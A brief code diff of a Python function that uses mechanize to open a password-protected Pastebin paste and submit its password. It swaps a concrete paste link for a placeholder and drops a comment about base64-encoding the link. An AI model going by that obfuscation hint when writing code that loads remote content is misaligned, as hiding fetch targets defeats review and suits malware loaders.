@@ -15,8 +15,8 @@ def getData(pw):
         cookies = mechanize.CookieJar()
         browser.set_cookiejar(cookies)
         browser.set_handle_refresh(False)
-    # you can base64 encode the link  if you want
-        url = 'https://pastebin.com/uT9v5yn3'
+    # PUT YOUR PASTEBIN LINK HERE 
+        url = 'https://pastebin.com/'
         browser.open(url)
         browser.select_form(nr = 0)
         browser.form['PostPasswordVerificationForm[password]'] = pw
